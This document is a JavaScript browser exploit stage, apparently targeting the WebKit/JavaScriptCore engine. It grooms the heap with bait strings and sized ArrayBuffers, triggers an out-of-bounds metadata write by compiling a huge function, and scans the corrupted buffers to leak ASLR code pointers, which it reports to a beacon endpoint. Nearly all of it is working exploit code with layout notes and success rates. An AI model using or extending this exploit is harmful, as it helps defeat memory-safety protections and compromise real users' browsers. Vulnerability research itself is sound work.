// p488 — MetadataTable ASLR Leak via Interleaved ArrayBuffer Spray
//
// STRATEGY (combines proven p156 bait-and-switch with AB target spray):
//
// The p156 bait-and-switch is PROVEN (14/14 corruption on 2 devices).
// But JSString targets only gave .length=81400 (m_bytecodeIndex at entry+68).
// We need the THUNK ADDRESS at entry+24 (8 bytes, ASLR-dependent code pointer).
//
// Plan:
//  1. Main thread allocates 20 bait strings (~100KB StringImpl → marge ~102KB slot)
//  2. Main thread allocates 30 target ArrayBuffers (100,112 bytes each, 0xBB sentinel fill)
//  3. Free baits + GC pressure → low marge pages freed
//  4. Compile 38.3M op_call function → metadata buffer gets freed low slot (first-fit)
//  5. finishCreation sweep writes 4.29GB forward → through AB backing stores
//  6. Scan ABs for non-sentinel bytes at 112-byte stride, specifically entry+24 (thunk)
//
// AB size = 100,112 bytes = EXACT match for MetadataTable allocation
//   (sizeof(LinkingData)=16 + wrapped totalSize=100,096)
//
// Per OOB entry layout (112 bytes, JIT=OFF):
//   +0-11:  PackedRawSentinelNode (zeroed)
//   +12-15: m_slowPathCount = 0
//   +16-23: m_doneLocation = 0 or code addr
//   +24-31: m_slowPathCallDestination = getCTILinkCall().code() ← THUNK (ASLR LEAK)
//   +32-63: union + WriteBarriers (mostly zeroed)
//   +64-67: bit fields + m_callType
//   +68-71: m_bytecodeIndex = sequential index
//   +72-83: ArrayProfile (zeroed)
//   +84-87: padding
//   +88-111: ValueProfile (zeroed)
//
// Beacon prefix: V488-

(function() {
  var BASE = location.protocol + '//' + location.host;
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V488-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send(body || '');
    } catch(e) {}
  }
  function hx8(arr, off) {
    var s = '';
    for (var i = 7; i >= 0; i--) s += ('0' + arr[off + i].toString(16)).slice(-2);
    return '0x' + s;
  }

  B('BOOT', navigator.userAgent);

  // ═══════════════════════════════════════════════════════
  // PHASE 1: BAIT STRINGS (main thread, lower marge pages)
  // These occupy ~100KB marge slots. Will be freed to create
  // holes for the metadata buffer (first-fit).
  // ═══════════════════════════════════════════════════════
  var N_BAIT = 20;
  var STR_LEN = 100000;
  var baits = [];

  B('BAIT-START');
  for (var i = 0; i < N_BAIT; i++) {
    var s = '';
    for (var j = 0; j < STR_LEN; j += 1000) {
      s += 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB';
    }
    s = s.substring(0, STR_LEN);
    s.charCodeAt(0); // resolve rope → allocate StringImpl in marge
    baits.push(s);
  }
  B('BAIT-DONE-' + N_BAIT);

  // ═══════════════════════════════════════════════════════
  // PHASE 2: TARGET ARRAYBUFFERS (higher marge pages)
  // 100,112 bytes = exact MetadataTable allocation size
  // Fill with 0xBB sentinel so we detect sweep writes
  // ═══════════════════════════════════════════════════════
  var AB_SIZE = 100112;
  var N_TARGETS = 30;
  var targets = [];
  var views = [];

  B('AB-START');
  for (var i = 0; i < N_TARGETS; i++) {
    var ab = new ArrayBuffer(AB_SIZE);
    var u8 = new Uint8Array(ab);
    for (var j = 0; j < AB_SIZE; j++) u8[j] = 0xBB;
    targets.push(ab);
    views.push(u8);
  }
  B('AB-DONE-' + N_TARGETS);

  // ═══════════════════════════════════════════════════════
  // PHASE 3: FREE BAITS + GC PRESSURE
  // Free bait strings to create holes in lower marge pages.
  // GC pressure reclaims the marge pages.
  // Metadata buffer will first-fit into a freed bait slot.
  // ═══════════════════════════════════════════════════════
  for (var i = 0; i < baits.length; i++) baits[i] = null;
  baits = null;

  var gcRound = 0;
  function gcPressure() {
    for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
    for (var j = 0; j < 500; j++) new Array(100).fill(gcRound);
    gcRound++;
    if (gcRound < 30) {
      setTimeout(gcPressure, 30);
    } else {
      B('GC-DONE-' + gcRound);
      phaseBuild();
    }
  }
  gcPressure();

  // ═══════════════════════════════════════════════════════
  // PHASE 4: BUILD 38.3M op_call FUNCTION
  // ═══════════════════════════════════════════════════════
  function phaseBuild() {
    B('BUILD-START');
    var N = 38348816;
    var CHUNK = 4000000;
    var nC = Math.floor(N / CHUNK);
    var rem = N - nC * CHUNK;

    var callChunk = '';
    for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
    var remChunk = '';
    for (var r = 0; r < rem; r++) remChunk += 'a();';

    var parts = ['window.__v488fn=function(a){'];
    for (var ch = 0; ch < nC; ch++) parts.push(callChunk);
    parts.push(remChunk);
    parts.push('};window.__v488ok=true;');

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + (blob.size / 1024 / 1024).toFixed(0) + 'MB');
    callChunk = null;
    remChunk = null;
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onerror = function() { B('SCRIPT-ERR'); };
    sc.onload = function() {
      B('COMPILED-' + (window.__v488ok ? 'OK' : 'FAIL'));
      if (!window.__v488fn) { B('NO-FN'); return; }
      phaseCall();
    };
    document.head.appendChild(sc);
    sc.src = url;
  }

  // ═══════════════════════════════════════════════════════
  // PHASE 5: CALL THE FUNCTION (triggers finishCreation sweep)
  //
  // NOTE: finishCreation happens during compilation (script eval).
  // But the function needs to be called for execution-time writes.
  // Actually — finishCreation writes entry+24 (thunk) during COMPILE.
  // So we should scan BEFORE calling too!
  // ═══════════════════════════════════════════════════════
  function phaseCall() {
    // SCAN BEFORE CALL — finishCreation already ran during compilation
    B('SCAN-PRE-CALL');
    scanTargets('PRE');

    // Now call the function (adds execution-time writes: m_slowPathCount, ValueProfile)
    // Use a throwing callback to limit sweep depth during execution
    B('CALLING');
    var callCount = 0;
    try {
      window.__v488fn(function() {
        callCount++;
        if (callCount > 960) throw 'stop';
      });
    } catch(ex) {
      B('CATCH', (ex.message || String(ex)).substring(0, 60));
    }
    B('CALLS-' + callCount);

    // SCAN AFTER CALL — now has execution-time data too
    B('SCAN-POST-CALL');
    scanTargets('POST');

    B('DONE');
  }

  // ═══════════════════════════════════════════════════════
  // SCAN: Check each AB for non-sentinel bytes
  // Look specifically at 112-byte stride for entry+24 (thunk)
  // ═══════════════════════════════════════════════════════
  function scanTargets(prefix) {
    var anyHit = false;

    for (var t = 0; t < N_TARGETS; t++) {
      var u8 = views[t];

      // Quick check: is ANY byte != 0xBB?
      var firstNonSentinel = -1;
      for (var i = 0; i < AB_SIZE; i++) {
        if (u8[i] !== 0xBB) {
          firstNonSentinel = i;
          break;
        }
      }

      if (firstNonSentinel === -1) continue; // all sentinel, sweep didn't reach this AB

      anyHit = true;
      B(prefix + '-HIT-' + t, 'firstByte=' + firstNonSentinel);

      // Count non-sentinel bytes
      var nonSent = 0;
      for (var i = 0; i < AB_SIZE; i++) {
        if (u8[i] !== 0xBB) nonSent++;
      }
      B(prefix + '-NSENT-' + t, '' + nonSent + '/' + AB_SIZE);

      // Read at 112-byte stride: entry+24 (thunk, 8 bytes)
      var f64 = new Float64Array(u8.buffer);
      var thunks = [];
      for (var e = 0; e < Math.floor(AB_SIZE / 112); e++) {
        var byteOff = e * 112 + 24;
        if (byteOff + 8 > AB_SIZE) break;

        // Check if this 8-byte window has non-sentinel data
        var isSentinel = true;
        for (var b = 0; b < 8; b++) {
          if (u8[byteOff + b] !== 0xBB) { isSentinel = false; break; }
        }
        if (isSentinel) continue;

        var hex = hx8(u8, byteOff);
        thunks.push('e' + e + '=' + hex);
      }
      if (thunks.length > 0) {
        // Split into chunks to fit POST body
        var joined = thunks.join(',');
        for (var c = 0; c < joined.length; c += 800) {
          B(prefix + '-THUNK-' + t + '-' + Math.floor(c / 800), joined.substring(c, c + 800));
        }
      }

      // Also read entry+68 (m_bytecodeIndex, 4 bytes) for the first 5 entries
      var idxs = [];
      for (var e = 0; e < Math.min(5, Math.floor(AB_SIZE / 112)); e++) {
        var byteOff = e * 112 + 68;
        if (byteOff + 4 > AB_SIZE) break;
        var val = u8[byteOff] | (u8[byteOff+1] << 8) | (u8[byteOff+2] << 16) | (u8[byteOff+3] << 24);
        if (val !== 0xBBBBBBBB) idxs.push('e' + e + '=' + val);
      }
      if (idxs.length > 0) B(prefix + '-IDX-' + t, idxs.join(','));

      // Hex dump first 224 bytes (2 entries) for detailed analysis
      var dump = '';
      for (var i = 0; i < Math.min(224, AB_SIZE); i++) {
        dump += ('0' + u8[i].toString(16)).slice(-2);
      }
      B(prefix + '-DUMP-' + t, dump);

      // Also check for pointer-like values at entry+32..+56 (WriteBarrier fields)
      var ptrs = [];
      for (var e = 0; e < Math.min(10, Math.floor(AB_SIZE / 112)); e++) {
        for (var pOff = 32; pOff <= 56; pOff += 8) {
          var byteOff = e * 112 + pOff;
          if (byteOff + 8 > AB_SIZE) break;
          var isSent = true;
          for (var b = 0; b < 8; b++) {
            if (u8[byteOff + b] !== 0xBB) { isSent = false; break; }
          }
          if (!isSent) {
            ptrs.push('e' + e + '+' + pOff + '=' + hx8(u8, byteOff));
          }
        }
      }
      if (ptrs.length > 0) B(prefix + '-PTRS-' + t, ptrs.join(','));
    }

    if (!anyHit) B(prefix + '-MISS', 'all ABs still sentinel');
  }
})();
